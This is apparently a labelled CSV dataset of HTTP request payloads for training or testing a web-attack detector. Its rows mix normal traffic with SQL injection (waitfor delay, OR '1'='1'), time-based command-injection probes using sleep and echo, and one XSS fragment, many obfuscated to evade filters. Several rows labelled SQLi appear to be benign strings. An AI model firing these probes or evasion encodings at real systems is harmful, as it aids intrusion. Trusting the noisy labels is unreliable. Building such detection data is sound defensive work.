payload,label,source
"modo=registro&login=einersen&password=despagada&nombre=Emanuel&apellidos=Sarrasec+Ar�valo&email=','0');waitfor+delay+'0:0:15';--&dni=96118316M&direccion=Passatge+Del+Sol,+0+13?D&ciudad=Megeces&cp=42148&provincia=M�laga&ntc=8462242772116416&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
\u00446255\u0043403\u004507884A977853CAC0\u0045\u0041\u0046\u00415F,SQLi,obfuscation:unicode_escape
%7C%20%5\u0042%203%20-\u006e\u0065%20%24%28echo%20\u0056\u004e\u0041L\u005aQ%20%7C%20\u0074r%20-\u0064%20%27%5\u0043\u006e%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20\u0073le\u0065\u0070%201%20%22,CMD,obfuscation:unicode_escape
%26echo%20ZPAVCI%00$((24%2B53))$(echo%20ZPAVCI)ZPAVCI//,CMD,obfuscation:null_byte
1E51655CA0F1C4615FC5BF13CCCB169C,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%3B%20str%3D%24%28echo%20TLXEJK%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%22,CMD,seclists_cmd
E3AAC0D8239D8FD970E944104D350486,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%7C%20%5B%202%20-ne%20%24%28echo%20TFJKCP%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27,CMD,seclists_cmd
"{""a"":{""b"":""p41en4t63o""}}",SQLi,obfuscation:json_nested_escape
261198491749151155410D85F4EC73C2,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"--WebKitFormBoundary79551
Content-Disposition: form-data; name=""q""

51A369013702AA877F979C0474F59A58
--WebKitFormBoundary79551--",SQLi,obfuscation:multipart_boundary_sim
B8E658A9FF5015CA28567025E951B805,Normal,csic_gsi:cisc_normalTraffic_test.txt
6F62D2F6A9CDD93A75BCD8C43224C113,Normal,csic_gsi:cisc_normalTraffic_test.txt
715417c94oR$i3,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2527%7C%20%5B%207%20-ne%20%24%28echo%20LVDDNF%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,CMD,seclists_cmd
6EA961D9112D25B8DAEA3890B1BE4F24,Normal,csic_gsi:cisc_normalTraffic_test.txt
%253Becho%252520NHFBAI%2524%2528%252891%25252B84%2529%2529%2524%2528echo%252520NHFBAI%2529NHFBAI%252527,CMD,obfuscation:double_url_encode
7DCF3957AB12F4518C277E3C99E970F8,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%7C%20%5b%205%20-ne%20%24%28ECHo%20eUILiT%20%7c%20Tr%20-D%20%27%5cN%27%20%7c%20Wc%20-c%29%20%5D%20%7C%7C%20sleeP%201%20%27,CMD,obfuscation:case_random
%26%20ｓlｅｅp%200%20%26%26%20ｓｔr%3D%24%28ｅcho%20FAPCEG%29%20%26%26%20sｔr1%3D%24%7B%23ｓtr%7D%20%26%26%20%5B%209%20-eq%20%24%7Bｓｔr1%7D%20%5D%20%26%26%20sｌｅep%201%20%257C,CMD,obfuscation:unicode_normalization
D395B1150CE8E1B017D1F809176FAE5E,Normal,csic_gsi:cisc_normalTraffic_train.txt
"\u0043/+Dri\u007a\u0061,+63+11-D",SQLi,obfuscation:unicode_escape
%2522%7C%20%5B%204%20-ne%20%24%28echo%20GZCIAW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-%00c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,obfuscation:null_byte
%7C%20%5B%205%20-ne%20%24%28echo%20AJEWOJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%27,CMD,seclists_cmd
D4E5A25E75262061F7D6548947B226E4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"--WebKitFormBoundary61756
Content-Disposition: form-data; name=""q""

%0A%20str%3D%24%28echo%20IEZSHQ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522
--WebKitFormBoundary61756--",CMD,obfuscation:multipart_boundary_sim
"--WebKitFormBoundary56271
Content-Disposition: form-data; name=""q""

&&echo$IFSXUVPOU$((27%2B3))$(echo$IFSXUVPOU)XUVPOU%5C%5C
--WebKitFormBoundary56271--",CMD,obfuscation:multipart_boundary_sim
AFE5CFC400F0771EDB0CDBC218A85447,Normal,csic_gsi:cisc_normalTraffic_train.txt
A5B0DC3295AECED23970F718FA3AD59F,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&id=1669337364255501,SQLi,obfuscation:hpp_duplicate_param
%00,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C604716AE880FC14223A42556306AE0F,Normal,csic_gsi:cisc_normalTraffic_test.txt
10610' OR '1'='1,SQLi,obfuscation:logic_or_tautology
Valor+AGUDO,SQLi,obfuscation:case_random
nEaN+D'ER,SQLi,obfuscation:case_random
'||EchO$iFSUyekYZ$((46%2B2))$(EchO$IfSuYEKYZ)uYekyZ%27,CMD,obfuscation:case_random
"--WebKitFormBoundary94189
Content-Disposition: form-data; name=""q""

7F130CB20003E465C5676207E82EFAF8
--WebKitFormBoundary94189--",SQLi,obfuscation:multipart_boundary_sim
AF0978F687403B608B9A85BAE1A9C830,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&id=Seriny�,SQLi,obfuscation:hpp_duplicate_param
eval(atob('NEQ3MDMxNUYxQjNBMTNCQUExN0E5OEIwRkIwNEREN0Y=')),SQLi,obfuscation:base64_fragment
24B464CFEE823593C12E18519D18B7A6' OR '1'='1,SQLi,obfuscation:logic_or_tautology
%000204088681426033,SQLi,obfuscation:null_byte
id=1&nombre=Jam�n+Ib�rico&precio=85&cantidad=2&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
E64135713DB38ABF10CF615FFE2F2046,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20GOUIRV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20,CMD,seclists_cmd
2E6BF4F5EAD893D78E86A06BD981E08A,Normal,csic_gsi:cisc_normalTraffic_train.txt
eval(atob('JTI2JTIwc2xlZXAlMjAwJTIwJTI2JTI2JTIwc3RyJTNEJTI0JTI4ZQ=='))cho%20YXUPUJ%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%255C%255C,CMD,obfuscation:base64_fragment
0int67no' OR '1'='1,SQLi,obfuscation:logic_or_tautology
eval(atob('Sm9yZGErRXNjb2zvv70nKTt3YWl0Zm9yK2RlbGF5KycwOjA6MTUnOy0t')),SQLi,obfuscation:base64_fragment
%2526%2520sleep%25200%2520%2526%2526%2520str%253D%2524%2528echo%2520OGQLYS%2529%2520%2526%2526%2520str1%253D%2524%257B%2523str%257D%2520%2526%2526%2520%255B%25207%2520-eq%2520%2524%257Bstr1%257D%2520%255D%2520%2526%2526%2520sleep%25201%2520%2522,CMD,obfuscation:url_encode
42150/*--*/,SQLi,obfuscation:nested_comment
exudar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
id=1&id=off/,SQLi,obfuscation:hpp_duplicate_param
AD1AFE5414F7EAAF361738DD253E1808,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"{""a"":{""b"":""Merinas""}}",SQLi,obfuscation:json_nested_escape
3C1055298572F380ECE6EFAF434CC493,Normal,csic_gsi:cisc_normalTraffic_train.txt
43B91BCEFA884FCD7A47%008E97C01EFF15,SQLi,obfuscation:null_byte
"--WebKitFormBoundary62810
Content-Disposition: form-data; name=""q""

46BFE1D8769E7884606DD60553E1FD0C
--WebKitFormBoundary62810--",SQLi,obfuscation:multipart_boundary_sim
"{""a"":{""b"":""va7icinio""}}",SQLi,obfuscation:json_nested_escape
%3B%20str%3D%24%28echo%20EWCHCT%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%26,CMD,seclists_cmd
0BB4E32F48393C654ACEEB15E06746B8' OR '1'='1,SQLi,obfuscation:logic_or_tautology
fiLosOFAR,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%26ｅchｏ%20NSDCQT$((87%2B20))$(ｅcho%20NSDCQT)NSDCQT%2F%2F,CMD,obfuscation:unicode_normalization
eval(atob('M0VDM0ZEMTMzOTJDQkQwOUU4OEJBMkEzN0U2NDQyRDY=')),SQLi,obfuscation:base64_fragment
"moDO=rEGIstRo&login=nORIO8&PASSwORd=4l7CT4Ot7Pi5A&NOmbrE=jAEn&apELliDOs=aLiCaNte+OrunA&emAiL=cUMbY@blOGsmegUMI.LY&dnI=01105274d&dIRecCiOnA=CALle+GERMan+monzoN+GaMOn,+46+&ciudAD=PueNTE+lA+ReInA+De+jaca&cp=08278&PROVInciA=cIuDAD+ReAl&nTc=3246974816793870&B1=reGistrar",SQLi,obfuscation:case_random
EBAE29C00A998244129F4D9642443089,Normal,csic_gsi:cisc_normalTraffic_train.txt
%22%26%20slee\u0070%200%20%26%26%20\u0073\u0074\u0072%3\u0044%24%28\u0065c\u0068o%20Z\u0044\u0045M\u0056I%29%20%26%26%20\u0073tr1%3\u0044%24%7B%23str%7\u0044%20%26%26%20%5B%208%20-\u0065\u0071%20%24%7\u0042st\u00721%7\u0044%20%5D%20%26%26%20\u0073\u006c\u0065e\u0070%201%20//,CMD,obfuscation:unicode_escape
"{""a"":{""b"":""7896""}}",SQLi,obfuscation:json_nested_escape
%252526%252526echo%252520QOZRFB%2524%2528%252819%25252B4%2529%2529%2524%2528echo%252520QOZRFB%2529QOZRFB,CMD,obfuscation:double_url_encode
B2/**/=/**/Vaciar+carritoparos%22+style%3D%22background%3Aurl%28javascript%3Aalert%28%27Paros%27%29%29&id/**/=/**/2,SQLi,obfuscation:inline_comment
reardon@tvup.jo,Normal,csic_gsi:cisc_normalTraffic_test.txt
"%7CEcHO$iFSaTHGRY$((94%2B45))$(ECho$iFsAThgRY)ATHgRy""",CMD,obfuscation:case_random
\u0043E2\u0045E5EC1A85F22F21E90\u0044\u0043\u004284796532,SQLi,obfuscation:unicode_escape
modo=insertar&precio=948&B1=Confirmar,Normal,csic_gsi:cisc_normalTraffic_test.txt
"{""a"":{""b"":""85324073F""}}",SQLi,obfuscation:json_nested_escape
6sp51ri0a/*--*/,SQLi,obfuscation:nested_comment
modo=registro&login=brackin&password=$leo&nombreA=Clacer&apellidos=Roza+Port�s&email=argibay_galabrue7@am-si.kn&dni=59004252Y&direccion=Pla�a+D'+Hostafrancs+102+&ciudad=Arjonilla&cp=37338&provincia=Vizcaya&ntc=6040441906133947&B1=Registrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
eval(atob('IiUyNmVjaG8kSUZTVFFVSEdUJCgoNTElMkI5KSkkKGVjaG8kSUZTVA=='))QUHGT)TQUHGT|,CMD,obfuscation:base64_fragment
%2522%0A%20ｓtr%3D%24%28ｅchｏ%20ZLOWUA%29%0A%20ｓｔr1%3D%24%7B%23sｔr%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20ｓｌｅep%200%0A%20eｌｓｅ%20ｓｌｅｅp%201%0A%20fｉ%20%257C,CMD,obfuscation:unicode_normalization
3fb10361357350dadD4E4e710bcF78E9,SQLi,obfuscation:case_random
%3b%20sTr%3D%24%28ecHO%20HDixtH%29%3B%20stR1%3D%24%7B%23str%7d%3b%20IF%20%5B%208%20-nE%20%24%7bSTR1%7d%20%5D%3B%20thEN%20SlEEP%200%3B%20elSe%20sLEep%201%3b%20fi%20%22,CMD,obfuscation:case_random
6EC\u0046D461\u0046C\u004313\u00466F2\u004119\u0045\u004301F719042E,SQLi,obfuscation:unicode_escape
tarifa,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3B14D5635F8E39B147%008BD37593ADC019,SQLi,obfuscation:null_byte
03517,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Abenoza+Esplugues,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
20D7C52CE25CAEDDFB1F036EC02177C4,Normal,csic_gsi:cisc_normalTraffic_train.txt
70,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
MOwErY@SayuelA.pH,SQLi,obfuscation:case_random
"--WebKitFormBoundary30289
Content-Disposition: form-data; name=""q""

73D458C8F0A636A1D2EC8D65BA34A239
--WebKitFormBoundary30289--",SQLi,obfuscation:multipart_boundary_sim
"--WebKitFormBoundary86463
Content-Disposition: form-data; name=""q""

Sastre+Molt�
--WebKitFormBoundary86463--",SQLi,obfuscation:multipart_boundary_sim
8811866823125640,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2529%253B%257Dprint%2528%2560echo%252520MSEKQO%253Becho%252520%2524%2528%252887%25252B12%2529%2529%253Becho%252520MSEKQO%253Becho%252520MSEKQO%2560%2529%25253B.%25252522MSEKQO,CMD,obfuscation:double_url_encode
%25257C%252520%25255B%2525205%252520-ne%252520%252524%252528echo%252520MMQKSR%252520%25257C%252520tr%252520-d%252520%252527%25255Cn%252527%252520%25257C%252520wc%252520-c%252529%252520%25255D%252520%25257C%25257C%252520sleep%2525201%252520%252526,CMD,obfuscation:double_url_encode
CDE9DCD2938891C8CA68B7C997FBDD5C,Normal,csic_gsi:cisc_normalTraffic_train.txt
"--WebKitFormBoundary26377
Content-Disposition: form-data; name=""q""

05BD237CEDBCE58DCA81CFBC2B6EE26B
--WebKitFormBoundary26377--",SQLi,obfuscation:multipart_boundary_sim
Alexis/*--*/,SQLi,obfuscation:nested_comment
eval(atob('JTBBJTIwc3RyJTNEJTI0JTI4ZWNobyUyME1LSlhDVyUyOSUwQSUyMA=='))str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527,CMD,obfuscation:base64_fragment
B5CDF14A9A7D453D3DA1958E6CA30296,Normal,csic_gsi:cisc_normalTraffic_test.txt
B2%253DVaciar%252Bcarrito%2527%252C%25270%2527%252C%25270%2527%252C%25270%2527%2529%253Bwaitfor%252Bdelay%252B%25270%253A0%253A15%2527%253B--,SQLi,obfuscation:double_url_encode
%26%26ｅcho%20XVKSQG$((73%2B31))$(ｅchｏ%20XVKSQG)XVKSQG&,CMD,obfuscation:unicode_normalization
%26%26echo%20KHAVOV$((90%2B77))$(echｏ%20KHAVOV)KHAVOV,CMD,obfuscation:unicode_normalization
eval(atob('JTI3JTBBJTIwc3RyJTNEJTI0JTI4ZWNobyUyMFdZWVlaTSUyOSUwQQ=='))%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,CMD,obfuscation:base64_fragment
%2522%253Becho%24IFSFILOPR%24%28%2854%252B95%29%29%24%28echo%24IFSFILOPR%29FILOPR%22,CMD,obfuscation:url_encode
C948\u0046\u004283\u004491E\u0042111568\u00469\u00421DE1BAA1E5,SQLi,obfuscation:unicode_escape
3AC68761BB1FD6ED191263526D178690,Normal,csic_gsi:cisc_normalTraffic_train.txt
heston-bertran8%2540animextremist.qa,SQLi,obfuscation:double_url_encode
8c3ac1061fF01cc227A40A5C7A1343cf,SQLi,obfuscation:case_random
"--WebKitFormBoundary87494
Content-Disposition: form-data; name=""q""

%0A%20str%3D%24%28echo%20IHGKBJ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%255C%255C
--WebKitFormBoundary87494--",CMD,obfuscation:multipart_boundary_sim
816DDDC926FE7EBB5DD21CC7114D323A,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2527%26%20s\u006cee\u0070%200%20%26%26%20\u0073\u0074r%3D%24%28ec\u0068o%20\u0048\u0042IFJL%29%20%26%26%20\u0073tr1%3\u0044%24%7B%23s\u0074\u0072%7D%20%26%26%20%5\u0042%202%20-\u0065\u0071%20%24%7\u0042\u0073\u0074r1%7D%20%5D%20%26%26%20\u0073le\u0065p%201%20%26,CMD,obfuscation:unicode_escape
07441681P,Normal,csic_gsi:cisc_normalTraffic_train.txt
agathe,Normal,csic_gsi:cisc_normalTraffic_test.txt
D9D02E7E9DD470753C7A6DCA06DAAE4C' OR '1'='1,SQLi,obfuscation:logic_or_tautology
%2522%7C%20%5\u0042%203%20-ne%20%24%28\u0065\u0063\u0068o%20\u004aY\u0056\u0051\u0046\u004b%20%7\u0043%20\u0074\u0072%20-d%20%27%5\u0043\u006e%27%20%7C%20w\u0063%20-\u0063%29%20%5D%20%7\u0043%7C%20\u0073\u006c\u0065ep%201%20%2527,CMD,obfuscation:unicode_escape
"{""a"":{""b"":""modo=registro&login=radick&password=aleve&nombre=Par�s&apellidosA=Teruel+Illarraga&email=cawdon@programaciones.com.gg&dni=41955080K&direccion=C/+San+Jose+121,+11?D&ciudad=Holguera&cp=43894&provincia=Granada&ntc=8674124405846467&B1=Registrar""}}",SQLi,obfuscation:json_nested_escape
alberc8%2527q4%252Cero,SQLi,obfuscation:double_url_encode
%7C%20%5B%206%20-ne%20%24%28echo%20PENGWJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,seclists_cmd
modo%3Dentrar%26login%3Dstarkes%26pwd%3Dab393n5te%26remember%3Doff%26B1%3D%2500,SQLi,obfuscation:url_encode
spur?lock/*--*/,SQLi,obfuscation:nested_comment
"""echo$IFSKQIOUW$((81%2B20))$(echo$IFSKQIOUW)KQIOUW|",CMD,seclists_cmd
%7c%20%5B%209%20-Ne%20%24%28EChO%20tKxzeX%20%7c%20TR%20-d%20%27%5CN%27%20%7C%20Wc%20-C%29%20%5d%20%7C%7C%20slEeP%201%20%252f%252f,CMD,obfuscation:case_random
%26%26echo%24IFSSUKTVK%24%28%2849%252B30%29%29%24%28echo%24IFSSUKTVK%29SUKTVK,CMD,obfuscation:url_encode
%7C%20%5B%204%20-ne%20%24%28echo%20NVIYMO%20%7C%%0020tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%255C%255C,CMD,obfuscation:null_byte
"""||ech\u006f%20\u0052\u004a\u005a\u004c\u0047G$((1%2\u004214))$(\u0065cho%20\u0052J\u005aL\u0047\u0047)\u0052\u004a\u005aLGG%22",CMD,obfuscation:unicode_escape
%22%7c%20%5B%209%20-ne%20%24%28ecHo%20GbBAUv%20%7c%20tr%20-D%20%27%5cn%27%20%7C%20wc%20-c%29%20%5d%20%7C%7c%20sLeEP%201%20,CMD,obfuscation:case_random
5e1e45e2381473f008e02e30A3741EB7,SQLi,obfuscation:case_random
%7C%20%5B%207%20-ｎｅ%20%24%28ｅcho%20CDUKUS%20%7C%20tr%20-d%20%27%5Cｎ%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20ｓｌeｅp%201%20//,CMD,obfuscation:unicode_normalization
497189B73E1713598B754E82B0759A25,Normal,csic_gsi:cisc_normalTraffic_test.txt
"--WebKitFormBoundary15371
Content-Disposition: form-data; name=""q""

modo=entrar&login=trahan'+AND+'1'='1&pwd=72513662r719&remember=off&B1=Entrar
--WebKitFormBoundary15371--",SQLi,obfuscation:multipart_boundary_sim
E7CCB957CD5892AAD58CA251CF6AC3A5,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D885C56E0E0B1AA627FB737B0E17DECB,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
0E9E020BB88569FE060D0B8E9055252F,Normal,csic_gsi:cisc_normalTraffic_test.txt
E06039644AD98B1E27B4B8F333%00BBAC90,SQLi,obfuscation:null_byte
%27%3b%20Str%3d%24%28eCho%20gheHaj%29%3b%20Str1%3D%24%7B%23sTR%7d%3B%20If%20%5b%203%20-Ne%20%24%7bSTr1%7D%20%5D%3B%20theN%20sLeep%200%3b%20ELsE%20sLeEp%201%3b%20FI%20%257c,CMD,obfuscation:case_random
%252527%25257Cecho%2524IFSRWDBVK%2524%2528%252860%25252B13%2529%2529%2524%2528echo%2524IFSRWDBVK%2529RWDBVK%2527,CMD,obfuscation:double_url_encode
\u0054\u0065r\u0063\u0065\u0072o,SQLi,obfuscation:unicode_escape
%2527%7C%20%5B%208%20-ne%20%24%28echo%20JVVWQM%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2522,CMD,seclists_cmd
'&&ecHO%20KYoisy$((63%2b3))$(ecHO%20KYOIsY)kYOISY,CMD,obfuscation:case_random
%0A%20str%3D%24%28echo%20GNKPOL%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%22,CMD,seclists_cmd
4936D3EC76BC86B569CA00E8CCCC89EB,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27INJECTED_PARAM,SQLi,obfuscation:url_encode
%3B%20str%3D%24%28echo%20WSZRIR%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2527,CMD,seclists_cmd
Segovia%2B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
C%2F%2BSierra%2BMaigmo%2C%2BS%2FN%2C%2B1%3FD,SQLi,obfuscation:url_encode
Ogando+Huguet,Normal,csic_gsi:cisc_normalTraffic_test.txt
"--WebKitFormBoundary63176
Content-Disposition: form-data; name=""q""

A9107E1DA7CE9C6FBE4FD4F5A2698F14
--WebKitFormBoundary63176--",SQLi,obfuscation:multipart_boundary_sim
RAmAd%25EF%25BF%25BDn,SQLi,obfuscation:double_url_encode
id=1&id=46,SQLi,obfuscation:hpp_duplicate_param
%3B%20str%3D%24%28echo%20KWXVRQ%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C,CMD,seclists_cmd
'%26%00%26echo%20PMWJRH$((60%2B59))$(echo%20PMWJRH)PMWJRH%5C%5C,CMD,obfuscation:null_byte
;EcHO%20mpCsBG$((54%2B42))$(ECho%20MpCsbg)MpCSBG,CMD,obfuscation:case_random
chimento@fuzzy.bb' OR '1'='1,SQLi,obfuscation:logic_or_tautology
14a8u19lero/*--*/,SQLi,obfuscation:nested_comment
%3B%20ｓｔr%3D%24%28echｏ%20EEKJDE%29%3B%20ｓｔr1%3D%24%7B%23sｔr%7D%3B%20if%20%5B%202%20-ｎｅ%20%24%7Bｓｔr1%7D%20%5D%3B%20thｅｎ%20sleｅp%200%3B%20eｌsｅ%20sｌeｅp%201%3B%20fi%20%252F%252F,CMD,obfuscation:unicode_normalization
Cruselles+Varela,Normal,csic_gsi:cisc_normalTraffic_train.txt
%25252527%25250A%252520str%25253D%252524%252528echo%252520RQFVAS%252529%25250A%252520str1%25253D%252524%25257B%252523str%25257D%25250A%252520if%252520%25255B%2525201%252520-ne%252520%252524%25257Bstr1%25257D%252520%25255D%25250A%252520then%252520sleep%2525200%25250A%252520else%252520sleep%2525201%25250A%252520fi%252520%252F%252F,CMD,obfuscation:double_url_encode
%2522%252526echo%2524IFSKWABXB%2524%2528%252817%25252B13%2529%2529%2524%2528echo%2524IFSKWABXB%2529KWABXB,CMD,obfuscation:double_url_encode
495805FDDAF69F8DA7802A7C392BDB12,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%3\u0042%20s\u0074r%3D%24%28echo%20IO\u0042\u004eNP%29%3\u0042%20s\u0074r1%3D%24%7B%23\u0073\u0074\u0072%7D%3B%20\u0069f%20%5B%204%20-ne%20%24%7\u0042\u0073t\u00721%7D%20%5D%3B%20t\u0068en%20\u0073l\u0065ep%200%3B%20els\u0065%20\u0073l\u0065ep%201%3B%20fi%20%27,CMD,obfuscation:unicode_escape
%25252522%252526%252520sleep%2525200%252520%252526%252526%252520str%25253D%252524%252528echo%252520YBJQLF%252529%252520%252526%252526%252520str1%25253D%252524%25257B%252523str%25257D%252520%252526%252526%252520%25255B%2525204%252520-eq%252520%252524%25257Bstr1%25257D%252520%25255D%252520%252526%252526%252520sleep%2525201%252520%25255C%25255C,CMD,obfuscation:double_url_encode
0150E88CE081630067A3D442A7D17B55,Normal,csic_gsi:cisc_normalTraffic_train.txt
2AE0770840DE524FC30446081F0EA805,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%7\u0043%20%5B%207%20-n\u0065%20%24%28\u0065\u0063h\u006f%20EHUI\u004cY%20%7\u0043%20\u0074\u0072%20-\u0064%20%27%5\u0043\u006e%27%20%7C%20w\u0063%20-\u0063%29%20%5D%20%7\u0043%7\u0043%20\u0073leep%201%20%2522,CMD,obfuscation:unicode_escape
%0A%20str%3D%24%28echo%20DPBAVN%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
'.prinｔ(`ｅcho%20EVZCEK%0aｅcho%20$((38%2B37))%0aｅcho%20EVZCEK%0aechｏ%20EVZCEK`)%3B%25255C%25255CEVZCEK,CMD,obfuscation:unicode_normalization
%3B%20str%3D%24%28echo%20YUQKED%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%27,CMD,seclists_cmd
CE9C4688E2F56E90021077656142C293,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"mODO=regIsTRO&lOgin=hAttI&PaSsWoRd=viTUPERADor&NomBRe=?&APELlIDOs=C�mara+dovAle&EmAiL=tiEnSUWaN@zAraSaLUd.Py&DNI=84598781c&DireCcION=caLLE+SoR+MErcedEs+s/n+12-D&ciUdAD=llOar,+eL&Cp=24170&PRoVInCiA=vALLADolId&Ntc=4582509168680893&b1=reGIsTRAr",SQLi,obfuscation:case_random
%0A%20str%3D%24%28echo%20YCSCIW%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20//,CMD,seclists_cmd
id=1&id=Entrena,SQLi,obfuscation:hpp_duplicate_param
id=1&id=E5AE03F4B61646806ECCB21C80B7F6FE,SQLi,obfuscation:hpp_duplicate_param
32B102\u004397AF69\u0046\u0046\u004468\u0046\u0044B47\u0045C\u004165\u0046F\u0041B,SQLi,obfuscation:unicode_escape
